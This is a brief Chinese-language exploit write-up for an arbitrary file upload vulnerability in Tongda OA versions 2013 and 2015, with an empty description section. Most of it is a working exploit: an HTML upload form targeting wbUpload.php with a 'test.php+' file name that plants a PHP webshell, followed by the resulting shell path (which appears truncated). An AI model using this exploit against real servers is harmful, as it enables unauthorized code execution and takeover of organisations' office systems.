通达oa 任意⽂件上传漏洞
=======================

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

EXP:

    <form enctype="multipart/form-data" action="http://0-sec.org/general/vmeet/wbUpload.php
    ?fileName=test.php+" method="post">
    <input type="file" name="Filedata" size="50"><br>
    <input type="submit" value="Upload">
    </form>

上传jpg之后shell地址为

    http://0-sec.org/general/vmeet/wbUpload/test.ph
